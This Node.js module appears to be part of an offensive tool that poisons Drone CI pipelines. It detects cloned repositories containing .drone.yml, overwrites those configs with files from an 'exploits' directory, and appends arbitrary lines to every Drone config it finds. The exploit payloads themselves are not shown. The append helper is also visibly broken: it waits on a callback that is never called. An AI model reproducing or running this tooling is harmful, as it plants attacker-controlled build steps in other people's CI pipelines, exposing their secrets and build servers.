var log = console.log;
var chalk = require('chalk');
var readline = require('readline');
var repodir = __dirname + '/../../repos';
var exdir = __dirname + '/../exploits';
var repolist = __dirname + '/../../configs/repos';
var files = require(__dirname + '/../lib/files');
var targets = require(__dirname + '/../lib/targets');
var fs = require('fs');

module.exports = {

    // Checks checks repo to see if it contains Drone-ci content
    isDroneRepo: (reponame) => {
        return fs.existsSync(`${repodir}/${reponame}/.drone.yml`);
    },

    //Loads an exploit into said repo
    loadDroneConfig: (exploit, authed_user, repo_name, callback) => {
        if (module.exports.isDroneRepo(repo_name)) {
            fs.createReadStream(`${exdir}/${exploit}/.drone.yml`).pipe(fs.createWriteStream(`${repodir}/${repo_name}/.drone.yml`).on('close', () => {
                log(chalk.green(`Drone config for ${repo_name} successfully overwritten`));
                return callback();
            }));
        } else {
            log(chalk.yellow(`Tried to load ${exploit}, but ${repo_name} does not appear to be a Drone-Repository`));
            return callback();
        }

    },

    loadDroneConfigAll: (exploit, authed_user, drone_targets, callback) => {
        var promises = [];
        for(let target in drone_targets) {
            promises.push(new Promise((resolve, reject) => {
                module.exports.loadDroneConfig(exploit, authed_user, drone_targets[target], () => {
                    resolve();
                })
            }));
        }
        Promise.all(promises)
            .then(c => {
                return callback();
            }).catch(e => {
                log(chalk.red(`ERROR with function loadDroneConfigAll: ... ${e}`));
                return callback();
            })
    },

    //Get a list of cloned repos that contain .drone.yml files
    getForkedDroneRepos: (callback) => {
        var flist = files.walkSync(repodir);
        var tlist = []
        flist.forEach((item) => {
            if (item.includes(".drone.yml") && !item.includes("node_modules")) {
                tlist.push(item);
            }
        })
        return callback(tlist);
    },

    //Append line to drone config
    appendDroneConfig: (file, line) => {
        fs.appendFileSync(file, line, 'utf-8');
    },

    appendDroneConfigAll: (line, callback) => {
        var flist = files.walkSync(repodir);
        var promises = [];
        for (let f in flist) {
            if (flist[f].includes('.drone.yml')) {
                promises.push(new Promise((resolve, reject) => {
                    module.exports.appendDroneConfig(flist[f], line, () => {
                        resolve();
                    });
                }).catch(err => {
                    log(err);
                }))
            }
        }
        //.on('close', () => {
        Promise.all(promises)
            .then(c => {
                return callback();
            }).catch(e => {
                log(chalk.red(`ERROR with function appendDroneConfigAll: ... ${e}`));
                return callback();
            })
    }
}